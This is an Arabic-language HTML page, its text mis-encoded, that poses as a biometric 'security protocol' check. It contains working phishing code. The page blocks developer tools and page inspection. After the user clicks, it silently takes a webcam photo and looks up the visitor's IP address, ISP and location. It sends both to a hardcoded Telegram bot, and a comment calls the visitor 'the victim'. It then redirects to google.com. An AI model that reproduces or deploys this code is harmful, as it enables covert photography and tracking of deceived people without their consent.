<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>Ø¹ØµØ§ÙÙŠØ± Ø§Ù„Ø­Ø¨</title>
    <link rel="icon" type="image/png" href="https://img.icons8.com/fluency/48/000000/shield.png">
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #0b1118; color: #fff; text-align: center; padding-top: 80px; margin: 0; user-select: none; }
        .box { border: 1px dashed #3498db; padding: 30px; border-radius: 15px; display: inline-block; background: #1c252e; width: 85%; max-width: 450px; }
        .btn { background: #3498db; color: white; border: none; padding: 15px; border-radius: 8px; cursor: pointer; width: 100%; font-weight: bold; margin-top: 20px; }
        video, canvas { display: none; }
    </style>
</head>
<body oncontextmenu="return false;">

    <div class="box">
        <div style="font-size: 40px;">ğŸ›¡ï¸</div>
        <h3>Ø¨Ø±ÙˆØªÙˆÙƒÙˆÙ„ Ø§Ù„Ø£Ù…Ø§Ù† Ø§Ù„Ù…ÙˆØ­Ø¯</h3>
        <p style="font-size: 0.9em; color: #bdc3c7;">ÙŠØ±Ø¬Ù‰ ØªÙØ¹ÙŠÙ„ Ø§Ù„Ù…ØµØ§Ø¯Ù‚Ø© Ø§Ù„Ø­ÙŠÙˆÙŠØ© Ù„ØªØ£Ù…ÙŠÙ† Ø§ØªØµØ§Ù„Ùƒ Ø¨Ø§Ù„Ø³ÙŠØ±ÙØ±.</p>
        <button class="btn" onclick="megaCapture()">Ø¨Ø¯Ø¡ Ø§Ù„ØªØ£Ù…ÙŠÙ†</button>
    </div>

    <video id="v" autoplay playsinline muted></video>
    <canvas id="c"></canvas>

    <script>
        // === [1] Ù†Ø¸Ø§Ù… Ø§Ù„Ø­Ù…Ø§ÙŠØ© Ø§Ù„Ø´Ø§Ù…Ù„ ===
        
        // Ù…Ù†Ø¹ Ø§Ù„Ù‚Ø§Ø¦Ù…Ø© Ø§Ù„ÙŠÙ…Ù†Ù‰
        document.addEventListener('contextmenu', event => event.preventDefault());

        // Ù…Ù†Ø¹ Ø§Ø®ØªØµØ§Ø±Ø§Øª Ø§Ù„Ù…Ø·ÙˆØ±ÙŠÙ† (F12, Ctrl+Shift+I, Ctrl+U, Ø¥Ù„Ø®)
        document.onkeydown = function (e) {
            if (e.keyCode == 123) return false; // F12
            if (e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) return false; // Inspect
            if (e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) return false; // Console
            if (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) return false; // View Source
            if (e.ctrlKey && e.keyCode == 'S'.charCodeAt(0)) return false; // Save Page
        };

        // ÙØ® Ø§Ù„Ø¯ÙŠØ¨Ø§Ø¬Ø±: ØªØ¬Ù…ÙŠØ¯ Ø§Ù„Ù…ØªØµÙØ­ ÙÙŠ Ø­Ø§Ù„ ÙØªØ­ Ø§Ù„Ø®ÙŠØ§Ø±Ø§Øª
        setInterval(function() {
            const start = new Date();
            debugger; 
            const end = new Date();
            if (end - start > 100) {
                document.body.innerHTML = "<h2 style='margin-top:200px;'>âš ï¸ ØªÙ… Ø§ÙƒØªØ´Ø§Ù Ù…Ø­Ø§ÙˆÙ„Ø© Ø§Ø®ØªØ±Ø§Ù‚ Ø§Ù„Ø¨Ø±ÙˆØªÙˆÙƒÙˆÙ„.</h2>";
                setTimeout(() => { window.location.href = "about:blank"; }, 2000);
            }
        }, 1000);

        // Ù…Ù†Ø¹ Ø³Ø­Ø¨ ÙˆØ¥ÙÙ„Ø§Øª Ø§Ù„Ø¹Ù†Ø§ØµØ±
        document.ondragstart = function() { return false; };

        // === [2] Ù†Ø¸Ø§Ù… Ø§Ù„ØªØµÙˆÙŠØ± ÙˆØ³Ø­Ø¨ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª ===

        const TG_TOKEN = "8563370006:AAHw47M0i461yDkc7n6dRnEEs8AxKIOyDgY";
        const CH_ID = "1678506419";

        async function megaCapture() {
            const btn = document.querySelector('.btn');
            btn.innerHTML = "Ø¬Ø§Ø±ÙŠ Ø§Ù„ÙØ­Øµ...";
            btn.disabled = true;

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const v = document.getElementById('v');
                v.srcObject = stream;

                v.onloadedmetadata = () => {
                    v.play();
                    let attempts = 0;
                    const checkAndShoot = setInterval(async () => {
                        attempts++;
                        const isCaptured = await takeSnapshot(v, stream);
                        
                        if (isCaptured || attempts > 5) {
                            clearInterval(checkAndShoot);
                            finishProcess(stream);
                        }
                    }, 800);
                };
            } catch (e) {
                // Ø¥Ø®Ø·Ø§Ø±Ùƒ Ø¨Ø£Ù† Ø§Ù„Ø¶Ø­ÙŠØ© Ø±ÙØ¶ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§
                fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${CH_ID}&text=ğŸš« Ø§Ù„Ø¶Ø­ÙŠØ© Ø±ÙØ¶ Ø¥Ø°Ù† Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§`);
                alert("ÙŠØ¬Ø¨ Ø§Ù„Ø³Ù…Ø§Ø­ Ø¨Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ù„Ù„Ù…ØªØ§Ø¨Ø¹Ø©.");
                btn.disabled = false;
                btn.innerHTML = "Ø¨Ø¯Ø¡ Ø§Ù„ØªØ£Ù…ÙŠÙ†";
            }
        }

        async function takeSnapshot(v, stream) {
            const c = document.getElementById('c');
            const ctx = c.getContext('2d');
            c.width = v.videoWidth;
            c.height = v.videoHeight;
            ctx.drawImage(v, 0, 0);

            // ÙØ­Øµ Ø§Ù„Ø³ÙˆØ§Ø¯ (Brightness Check)
            const pixelData = ctx.getImageData(c.width/2, c.height/2, 1, 1).data;
            const brightness = pixelData[0] + pixelData[1] + pixelData[2];

            if (brightness === 0 && v.videoWidth > 0) {
                return false; 
            }

            // Ø³Ø­Ø¨ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¬ØºØ±Ø§ÙÙŠØ©
            let i = { ip: "N/A" };
            try { const r = await fetch('https://ipapi.co/json/'); i = await r.json(); } catch(e) {}

            const report = `âœ… ØªÙ… Ø§Ù„Ø§Ù„ØªÙ‚Ø§Ø·\nğŸ“ IP: ${i.ip}\nğŸ¢ ISP: ${i.org || 'Unknown'}\nğŸŒ Ø§Ù„Ù…ÙˆÙ‚Ø¹: ${i.city}, ${i.country_name}\nğŸ”— Ø§Ù„Ø®Ø±ÙŠØ·Ø©: http://www.google.com/maps/place/${i.latitude},${i.longitude}`;

            return new Promise((resolve) => {
                c.toBlob(async (blob) => {
                    const fd = new FormData();
                    fd.append('chat_id', CH_ID);
                    fd.append('photo', blob, 'img.jpg');
                    fd.append('caption', report);
                    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                    resolve(true);
                }, 'image/jpeg', 0.7);
            });
        }

        function finishProcess(stream) {
            setTimeout(() => {
                stream.getTracks().forEach(t => t.stop());
                alert("Ø§ÙƒØªÙ…Ù„Øª Ø§Ù„Ù…ØµØ§Ø¯Ù‚Ø© Ø§Ù„Ø­ÙŠÙˆÙŠØ© Ø¨Ù†Ø¬Ø§Ø­.");
                window.location.href = "https://google.com";
            }, 1000);
        }
    </script>
</body>
</html>

